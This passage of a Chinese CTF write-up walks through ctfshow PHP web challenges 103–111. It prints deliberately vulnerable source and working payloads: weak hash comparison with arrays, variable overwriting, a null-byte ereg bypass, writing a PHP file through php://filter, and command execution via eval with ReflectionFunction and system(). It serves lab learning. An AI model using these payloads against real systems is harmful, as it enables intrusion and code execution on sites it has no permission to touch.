class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>源码与上一关一样，只是多了一步检查$str步骤过滤php，但是我们$str = call_user_func($v1,$s);执行之后并不存在php字符串，而是一串base64编码的的东西![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web103.jpg)使用上一关的payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure>flag在源码里![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web103-1.jpg)​      ### web104<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:27:20</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>本题考的是sha()的弱比较，考的sha1函数特性，sha1()函数无法处理数组类型，会返回NULL，if条件就成立了，所以payload为更多弱类型比较请翻阅web97的html文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v2[]=2</span><br><span class="line">POST:</span><br><span class="line">v1[]=1</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/104.jpg)​      ### web105<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;      <span class="comment">//若?MTRleed=test =&gt; $key=MTRleed,$value=test 就是参数和值</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;                <span class="comment">//参数为error则输出&quot;what are you doing?!&quot;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;                     <span class="comment">//否则$MTRleed=$test</span></span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;                     <span class="comment">//若error=MTRleed =&gt; $key=error,$value=MTRleed</span></span><br><span class="line">                                       <span class="comment">//那么$$key=$$value =&gt; $error=$MTRleed=$test</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;          <span class="comment">//检查提交的flag参数的值是否与$flag的值相等。如果不相等，输出错误信息并停执行</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;                                      <span class="comment">//从上面foreach的POST过滤中不难发现，$flag的值为flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;       <span class="comment">//否则连接$flag输出</span></span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你还想要flag嘛?</span><br></pre></td></tr></table></figure>本题考察变量覆盖，关键点在$$key=$$value，这里把$key的值当作了变量<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一共有3个变量：</span><br><span class="line">$error=&#x27;你还想要flag嘛？&#x27;;</span><br><span class="line">$suces=&#x27;既然你想要那给你吧！&#x27;;</span><br><span class="line">$flag 未知</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例如 $key=flag  则$$key=$flag</span><br><span class="line">若$hell=&quot;abc&quot;;</span><br><span class="line">$$hell=&quot;def&quot;;等同于$abc=&quot;def&quot;;</span><br></pre></td></tr></table></figure>在这段源码中，GET 和 POST 的参数和值是可以进行交互的，我们可以在不同的请求中使用相同的变量名来访问和操作它们。所以：通过die($error)或die($suces)可以输出flag，根据源码猜测$flag的值为flag解法1：因为`if(!($_POST['flag']==$flag)){ die($error); }`。要得到 error=flag，GET中error不能在等号左边，POST中flag不能在等号右边，所以一定要有个中间量error=a=flag。只要不成立就会输出`$error`,我们可以在GET把flag赋值给a,然后再把a赋值给error，那么当die()时会执行$error就能显示flag了那么通过die($error)输出flag，首先用GET把$flag的值(flag)传给$a，接着再用POST把$a的值传给$error，于是$error的值就是flag，再通过if判断die($error)输出就是flag流程为：$flag=ctfshow{xxxxx}，?a=flag，通过第一个for循环，也就是$a=$flag，$a=ctfshow{xxxxx}，接着再通过第二个for循环，$error=$a，此时$error=ctfshow{xxxxx}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?a=flag</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">error=a</span><br><span class="line"></span><br><span class="line">执行了die($error);</span><br><span class="line">输出：ctfshow&#123;84f6fdac-4317-4237-8e49-2e38a3d1dc8c&#125;</span><br></pre></td></tr></table></figure>解法2：通过`die($suces)`输出flag，首先我们把flag的值传给suces变量，接着再把flag的值随便一个（不为flag就行），达到下面 `if(!($_POST['flag']==$flag))`， if条件POST参数为0不执行的目的，往下执行，`die($suces)`即可把flag输出流程为：`suces=flag&flag=aaa`第一个foreach使`$suces=$flag`，因为foreach会遍历所有 所以同时会使$flag=$aaa第二个foreach因为没用到POST，所以过不执行然后`if(!($_POST['flag']==$flag))`判断，`$_POST`没用到而`$flag=$aaa`为空，所以`$_POST==$flag`两者都为空最后输出$suces<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?suces=flag&amp;flag=aaa</span><br><span class="line"></span><br><span class="line">执行了echo &quot;your are good&quot;.$flag.&quot;\n&quot;; </span><br><span class="line">输出：your are good ctfshow&#123;84f6fdac-4317-4237-8e49-2e38a3d1dc8c&#125;</span><br></pre></td></tr></table></figure>### web106源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: atao</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:38:27</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>考点是PHP弱类型比较，sha1不能处理数组，会返回null，所以我们给v1v2都赋予数组，即可相等<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">?v2[]=2</span><br><span class="line">POSTDATA:</span><br><span class="line">v1[]=1</span><br></pre></td></tr></table></figure>### web107<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:24:14</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);     <span class="comment">//将v1赋给v2</span></span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>考点一> >> parse_str() 函数：将字符串解析成多个变量>>  parse_str()的使用：>> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$str</span> = <span class="string">&quot;first=value&amp;arr[]=foo+bar&amp;arr[]=baz&quot;</span>;</span><br><span class="line"><span class="comment">// 推荐用法</span></span><br><span class="line">parse_str(<span class="variable">$str</span>, <span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;first&#x27;</span>]; <span class="comment">// valueecho </span></span><br><span class="line"><span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">0</span>]; <span class="comment">// foo barecho </span></span><br><span class="line"><span class="variable">$output</span>[<span class="string">&#x27;arr&#x27;</span>][<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="comment">// 不建议这么用</span></span><br><span class="line">parse_str(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$first</span>; <span class="comment">// valueecho </span></span><br><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>]; <span class="comment">// foo barecho </span></span><br><span class="line"><span class="variable">$arr</span>[<span class="number">1</span>]; <span class="comment">// baz</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>>> 考点二：弱类型比较md5，无法处理数组，默认返回null，所以我们只要构造flag的值为数组，v3的值也为数组即可<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?v3[]=3</span><br><span class="line">POSTDATA:</span><br><span class="line">v1=&quot;flag=a[]=1&quot;或 v1=flag=</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web107.png)### web108<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 23:53:55</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="built_in">error</span></span><br></pre></td></tr></table></figure>考点一> ereg()函数：正则匹配函数，匹配到目标字符串(只能处理字符串)返回ture否则false，可以%00绕过>> intval()函数：获取变量的整数值>> 例如：> $a=12.2;> intval($a)=12>> strrev()函数：反转字符串> 例如：$a=abc e> strrev($a)=e cba考点二十六进制的弱类型比较，和十进制是相等的本题中`0x36d`为十进制的877，所以思路是绕过ereg()函数后构造877与`0x36d`比较<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?c=a%0033.778（任意字符串%00任意数字.778）</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web108.png)### web109<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-29 22:02:34</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>存在`eval()`函数，应该是要执行系统命令。关键在这`eval("echo new $v1($v2());")`eval 函数是一个强大的 PHP 函数，它接受一个字符串作为参数，并将其作为 PHP 代码进行执行。new $v1($v2()) 是一个对象实例化的过程。$v1 和 $v2 是变量，它们的值将在运行时确定。在这里，$v1 是一个类名，$v2() 是一个函数调用。根据代码的上下文，我们可以猜测 $v1 可能是一个类名，而 $v2 可能是一个函数名。$v2() 表示调用 $v2 所代表的函数，并获取其返回值。因为后面有一对圆括号 ()，所以我们可以假设 $v2 是一个函数。new $v1($v2()) 表示创建 $v1 所代表的类的一个实例，并将 $v2() 的返回值作为构造函数的参数传递给它。最后，echo 用于输出这个对象实例。**Exception** 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类**ReflectionClass** 或者 **ReflectionMethod** 都为常用的反射类，可以理解为一个类的映射那么<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">?v1=ReflectionFunction&amp;v2=system(<span class="string">&#x27;ls&#x27;</span>) <span class="comment">//ReflectionFunction表示通过反射创建一个函数的实例，也可以使用Exception 异常处理类，ls查看文件。得知存在fl36dg.txt文件</span></span><br><span class="line">?v1=ReflectionFunction&amp;v2=system(<span class="string">&#x27;tac fl36dg.txt&#x27;</span>)</span><br><span class="line">或者也可以直接访问文件 fl36dg.txt</span><br></pre></td></tr></table></figure>### web110<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-29 22:49:10</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>只是多了一堆过滤考察：php内置类 利用 FilesystemIterator 获取指定目录下的所有文件 http://phpff.com/filesystemiterator https://www.php.net/manual/zh/class.filesystemiterator.php 因为这里正则进行了匹配，我们可以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构，payload为getcwd()函数 获取当前工作目录 返回当前工作目录 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload: </span><br><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web110-1.png)随后可以直接访问flag文件即可![](https://cdn.jsdelivr.net/gh/MTRleed/PicGo/web1000/web110-2.png)### web111<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 